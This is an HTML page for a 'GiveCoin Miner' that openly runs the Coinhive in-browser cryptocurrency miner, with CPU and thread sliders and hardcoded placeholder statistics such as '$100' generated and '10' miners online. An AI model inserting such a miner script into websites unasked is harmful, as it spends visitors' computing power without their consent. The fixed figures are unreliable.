<html><head><title>GiveCoin</title><link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet"/><link rel="stylesheet" type="text/css" href="css/font-awesome.css"/><link rel="stylesheet" type="text/css" href="css/style.css"/><script src="https://code.jquery.com/jquery-3.2.1.min.js"></script><script src="https://coin-hive.com/lib/coinhive.min.js"></script><script src="js/animations.js"></script><script src="js/getcoin.js"></script><script src="js/profile.js"></script></head><body><div id="miner"><h1 id="name">GiveCoin Miner</h1><div class="profile"><div class="circle"><h4>0</h4><p>Rank</p></div><div class="circle"><h4 id="th">0</h4><p>Total Hashes</p></div><div class="circle"><h4 id="hps">0</h4><p>Hash Rate</p></div></div><div class="stats"><div class="settings"><div class="bar"><h5>CPU Usage</h5><input type="range" max="1" min="0" step=".1" defaultValue="0.5" oninput="setThrottle(this.value)"/></div><div class="bar"><h5>Threads</h5><input type="range" max="4" min="1" step="11" defaultValue="4" oninput="setThreads(this.value)"/></div></div><div class="panels"><div class="panel"><h5>Total Money Generated</h5><h4>$100</h4></div><div class="panel"><h5>Miners Online</h5><h4>10</h4></div></div></div></div></body></html>
